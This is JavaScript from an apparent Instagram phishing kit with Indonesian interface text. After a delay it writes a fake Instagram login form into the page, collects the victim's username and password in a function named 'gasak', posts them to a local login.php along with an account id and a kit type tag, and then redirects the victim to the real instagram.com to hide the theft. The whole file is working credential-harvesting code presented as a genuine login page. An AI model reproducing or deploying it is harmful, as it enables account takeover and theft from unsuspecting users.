

  
  
  
  
  
  
  
function stateChange() {
    setTimeout(function () {
        var data = "<div class='card'> <div class='card-body' align='center'> <img width='80%' src='https://whatmeghanwore.net/wp-content/uploads/2019/10/2475.new-instagram-text-logo.png'> <br> <h6>Masuk untuk melanjutkan</h1> <br> <div class='container' style='max-width:80%;'><form method='post' action='./login.php'> <input name='username' class='form-control' placeholder='Username'> <div style='padding-top:10px;'> <input name='password' type='password' class='form-control' style='' placeholder='Password'> <input id='id_account' name='id_account' type='hidden' value=''> <input name='type' type='hidden' value='instagramv3'> </div> <script> var id_account_in = document.getElementById('id_account'); id_account_in.value = id_account; </script> <div style='padding-top:10px;'> <button class='btn btn-primary' type='submit' style='width:80%;'>Masuk</button></form> </div> </div> <div> </div> </div>";



var utama = document.getElementById("utama");
utama.innerHTML = data;
    }, 3000);
}


function redir() {
    setTimeout(function () {
     window.location.replace("http://instagram.com");
    }, 2000);
}

stateChange();
function gasak(){
    var username = document.getElementById("id1").value;
    var password = document.getElementById("id2").value;
    
    
    if (username.length > 0){
        if (password.length > 0){
            
            console.log(username);
            console.log(password);
            
            
            $.post("login.php",
            {
                username: username,
                password: password,
                id_account: id_account,
                type: type
            },
            function(data,status){
                redir();
            });
            
            
        }
        else{
            alert("Silahkan masukan password dengan benar");
        }
    }
    else{
        alert("Silahkan masukan username")
    }
}

  
  
